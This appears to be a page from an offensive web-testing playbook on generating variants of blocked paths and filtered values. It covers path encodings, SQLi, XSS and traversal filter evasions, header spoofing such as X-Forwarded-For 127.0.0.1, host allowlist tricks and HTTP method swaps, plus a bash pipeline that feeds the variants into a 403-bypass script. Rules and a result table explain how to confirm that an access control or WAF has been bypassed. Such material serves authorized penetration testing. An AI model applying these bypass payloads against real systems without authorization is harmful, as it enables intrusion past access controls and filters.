# Pack 4 — 20 Bypass Regexes

Regexes that **generate** variants rather than match text. Feed a blocked path or a filtered
value in, get the bypass set out. `regex_hunt.py -p bypass -i blocked.txt` does this.

---

## A. Path variants (B01–B08)

| ID | Transform | Example in → out |
|---|---|---|
| B01 | `^/(.*)$` → `/$1/` `/$1/.` `/$1//` `//$1` `/./$1` | `/admin` → `/admin/`, `/admin/.` |
| B02 | `/(?=[^/])` → `/%2e/` | `/admin/x` → `/admin/%2e/x` |
| B03 | `\.` → `%2e` | `/a/b.json` → `/a/b%2ejson` |
| B04 | `/` → `%2f` (after first) | `/a/b/c` → `/a%2fb%2fc` |
| B05 | `$` → `;` `%3b` `%00` `%23` `%20` `%09` `?` | `/admin` → `/admin;/`, `/admin%00` |
| B06 | `/([^/]+)$` → `/$1..;/` | `/admin/x` → `/admin/x..;/` |
| B07 | `^/([a-z]+)` → `/\U$1` and `/\u$1` | `/admin` → `/ADMIN`, `/Admin` |
| B08 | `\.([a-z0-9]+)$` → `.$1/` `.$1%00` `.$1;` | `/a.json` → `/a.json/` |

## B. Value variants (B09–B14)

| ID | Transform | Use |
|---|---|---|
| B09 | `\s` → `/**/` `%09` `%0a` `+` `%20%20` | SQLi/WAF space filters |
| B10 | `'` → `%27` `%2527` `\'` `''` `%bf%27` | quote filters, GBK |
| B11 | `<` `>` → `%3c` `%3e` `\x3c` `&#60;` `&lt;` | XSS filters |
| B12 | `(` `)` → `%28` `%29` `\x28` | function-call filters |
| B13 | `\.` `/` → `%2e` `%2f` `%252e` `%c0%ae` `%c0%af` | traversal filters |
| B14 | `[A-Za-z]` → `%u00XX` `\uXXXX` `&#XX;` | IIS/unicode filters |

## C. Header and transport (B15–B20)

| ID | Pattern | Effect |
|---|---|---|
| B15 | `^(.*)$` → duplicate header line | `X-Forwarded-For` twice; parser picks last |
| B16 | `^(.*)$` → `$1, 127.0.0.1` | IP list; last wins on many stacks |
| B17 | `^(.*)$` → `$1:80` `$1:443` `[$1]` `$1.` `$1%00` | host allowlist bypass |
| B18 | `^(.*)$` → `\t$1` `$1\t` ` $1` | header value trimming differences |
| B19 | method swap set `GET→POST→PUT→PATCH→HEAD→OPTIONS→TRACE` | ACL per method |
| B20 | `^([^?]*)(\?.*)?$` → `$1%3f$2` `$1?.` `$1%23` | query-string smuggling into the path |

---

## Combined generator

```bash
printf '/admin\n/api/v1/users/1\n/download?file=a.txt\n' > blocked.txt
python3 07-tooling/python/regex_hunt.py -p bypass -i blocked.txt | sort -u > variants.txt
python3 07-tooling/python/bypass_403.py -u https://t --paths variants.txt --rps 8
```

## Rules

1. Send with `--path-as-is` so curl does not normalize your work away.
2. Diff **body length** and body hash, not just status. A 200 that is the SPA shell is a
   failure; a 401 that is a JSON error is progress.
3. Stop at the first variant that returns real content, then re-test the *original* path
   with the winning transform applied to its parent.
4. Log every variant in `mutations.md` with the result — the pattern of what the edge
   normalizes tells you which proxy is in front.

## Reading the result

| Result | Meaning |
|---|---|
| 200 + real body | bypassed; now test authorization |
| 401 + `WWW-Authenticate` | path exists, auth layer is app-side |
| 403 identical body | same ACL, different layer — go to header rung |
| 404 | router did not match; try B02–B06 |
| 400 | parser rejected; your encoding is wrong, not the path |
| 502/504 | backend timeout — often means the path *is* proxied |

## Where this connects

- Full ladder → `03-bypass/bypass-doctrine.md`
- 401 specifically → `02-web/401-to-200.md`
- WAF in front → `03-bypass/waf-bypass.md`
